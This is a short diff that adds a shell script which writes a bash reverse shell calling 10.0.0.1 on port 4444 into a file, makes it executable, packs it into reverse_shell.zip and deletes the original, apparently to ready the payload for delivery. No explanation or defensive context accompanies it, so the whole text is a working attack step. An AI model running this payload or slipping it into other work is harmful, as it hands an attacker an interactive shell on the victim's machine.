@@ -1,0 +1,6 @@
+echo '#!/bin/bash
+bash -i >& /dev/tcp/10.0.0.1/4444 0>&1' > reverse.sh
+
+chmod +x reverse.sh
+zip reverse_shell.zip reverse.sh
+rm reverse.sh
